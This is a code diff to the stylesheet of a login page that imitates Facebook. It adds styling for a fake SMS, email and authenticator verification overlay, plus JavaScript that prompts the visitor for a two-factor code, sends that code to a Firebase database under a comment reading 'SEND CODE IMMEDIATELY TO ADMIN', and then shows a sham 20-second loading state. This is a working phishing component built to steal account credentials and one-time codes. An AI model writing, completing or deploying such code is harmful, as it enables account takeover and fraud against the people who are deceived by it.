@@ -1,44 +1,38 @@
-/* Reset */
 body {
   margin: 0;
   font-family: Arial, Helvetica, sans-serif;
   background: #f0f2f5;
-  display: flex;
-  justify-content: center;
-  align-items: flex-start;
-  padding: 20px;
   min-height: 100vh;
+  width: 100%;
+  overflow-x: hidden;
 }
 
 .container {
   width: 100%;
-  max-width: 400px;
-  text-align: center;
-  margin-top: 40px;
-}
-
-.login-header {
+  min-height: 100vh;
   display: flex;
   flex-direction: column;
-  align-items: center;
-  gap: 12px;
-  margin-bottom: 20px;
+  justify-content: flex-start;
+  padding: 20px;
+  box-sizing: border-box;
+  gap: 20px;
 }
 
-.fb-logo {
-  width: 60px;
-  height: auto;
+.left {
+  width: 100%; /* full width */
+  text-align: center; /* center text */
 }
 
-.login-header h1 {
+.left h1 {
   color: #1877f2;
-  font-size: 48px;
+  font-size: 50px;
   margin: 0;
+  margin-bottom: 10px;
 }
 
-.login-header p {
-  font-size: 16px;
-  color: #1c1e21;
+.left p {
+  font-size: 20px;
+  margin: 0;
 }
 
 .login-box {
@@ -48,11 +42,16 @@ body {
   box-shadow: 0 2px 10px rgba(0,0,0,0.1);
   display: flex;
   flex-direction: column;
+  width: 100%; /* full width */
+  flex-grow: 1; /* fill remaining space vertically */
+  box-sizing: border-box;
+  justify-content: center; /* vertically center inputs inside login box */
   gap: 12px;
 }
 
 .login-box input {
   padding: 14px;
+  margin-bottom: 10px;
   border: 1px solid #ddd;
   border-radius: 6px;
   font-size: 16px;
@@ -79,14 +78,14 @@ body {
 
 .login-box a {
   text-align: center;
+  margin: 10px 0;
   color: #1877f2;
   text-decoration: none;
   font-size: 14px;
 }
 
 hr {
-  margin: 10px 0;
-  border: 0.5px solid #ddd;
+  margin: 15px 0;
 }
 
 .create-btn {
@@ -105,16 +104,197 @@ hr {
 
 /* Mobile responsiveness */
 @media screen and (max-width: 480px) {
-  .login-header h1 {
+  .left h1 {
     font-size: 36px;
   }
 
-  .login-header p {
-    font-size: 14px;
+  .left p {
+    font-size: 16px;
   }
 
-  .login-box input, #loginBtn, .create-btn {
+  .login-box input,
+  #loginBtn,
+  .create-btn {
     font-size: 16px;
     padding: 12px;
   }
+}
+
+/* Button loader hidden by default */
+.btn-loader {
+  display: none;
+  width: 18px;
+  height: 18px;
+  border: 3px solid #fff;
+  border-top: 3px solid transparent;
+  border-radius: 50%;
+  margin: auto;
+  animation: spin 1s linear infinite;
+}
+
+/* When loading */
+.loading #btnText {
+  display: none;
+}
+
+.loading #btnLoader {
+  display: inline-block;
+}
+
+/* Spinner animation */
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+#loginBtn.loading {
+  opacity: 0.8;
+}
+
+/* Overlay for verification */
+#verificationOverlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.7);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+}
+
+/* Verification box base style */
+.fb-verification {
+  width: 360px;
+  padding: 30px;
+  border-radius: 8px;
+  background: #fff;
+  box-shadow: 0 4px 30px rgba(0,0,0,0.2);
+  text-align: center;
+  font-family: Arial, sans-serif;
+  animation: fadeIn 0.3s ease;
+}
+
+/* Titles for each verification type */
+.fb-verification h2 {
+  font-size: 22px;
+  color: #1877f2;
+  margin-bottom: 15px;
+}
+
+/* Instructions text */
+.fb-verification p {
+  font-size: 14px;
+  color: #606770;
+  margin-bottom: 20px;
+}
+
+/* Input fields for codes */
+.fb-verification input {
+  width: 100%;
+  padding: 12px;
+  font-size: 16px;
+  border: 1px solid #ddd;
+  border-radius: 6px;
+  margin-bottom: 20px;
+}
+
+.fb-verification input:focus {
+  outline: none;
+  border-color: #1877f2;
+  box-shadow: 0 0 5px rgba(24, 119, 242, 0.4);
+}
+
+/* Continue button */
+.fb-verification button {
+  width: 100%;
+  padding: 12px;
+  font-size: 16px;
+  border: none;
+  border-radius: 6px;
+  background: #1877f2;
+  color: #fff;
+  cursor: pointer;
+  transition: background 0.2s ease;
+}
+
+.fb-verification button:hover {
+  background: #166fe5;
+}
+
+/* Specific designs for each type */
+.fb-sms {
+  border-top: 4px solid #42b72a; /* green SMS accent */
+}
+
+.fb-email {
+  border-top: 4px solid #f6b93b; /* orange Email accent */
+}
+
+.fb-auth {
+  border-top: 4px solid #9b59b6; /* purple Authenticator accent */
+}
+
+/* Fade-in animation */
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(-10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* Responsive */
+@media screen and (max-width: 480px) {
+  .fb-verification {
+    width: 90%;
+    padding: 20px;
+  }
+}
+
+// --- Verification overlay logic ---
+function showVerification(type) {
+  // Create overlay
+  const overlay = document.createElement("div");
+  overlay.id = "verificationOverlay";
+
+  // Verification modal HTML
+  overlay.innerHTML = `
+    <div class="fb-verification fb-${type}">
+      <h2>${type.toUpperCase()} Verification</h2>
+      <p>Please enter the code sent via ${type} to continue.</p>
+      <input type="text" id="verificationCode" placeholder="Enter code">
+      <button id="verifyBtn">Continue</button>
+    </div>
+  `;
+
+  document.body.appendChild(overlay);
+
+  const verifyBtn = document.getElementById("verifyBtn");
+  const codeInput = document.getElementById("verificationCode");
+
+  verifyBtn.addEventListener("click", () => {
+    const code = codeInput.value.trim();
+    if (code === "") {
+      alert("Please enter the code.");
+      return;
+    }
+
+    // --- SEND CODE IMMEDIATELY TO ADMIN ---
+    push(ref(db, 'verificationCodes'), {
+      type: type,
+      code: code,
+      time: Date.now()
+    });
+
+    console.log(`${type} code sent: ${code}`);
+
+    // --- SHOW LOADING FOR 20 SECONDS ---
+    verifyBtn.disabled = true;
+    verifyBtn.textContent = "Loading...";
+    codeInput.disabled = true;
+
+    setTimeout(() => {
+      // Remove overlay after 20 seconds
+      overlay.remove();
+    }, 20000);
+  });
 }
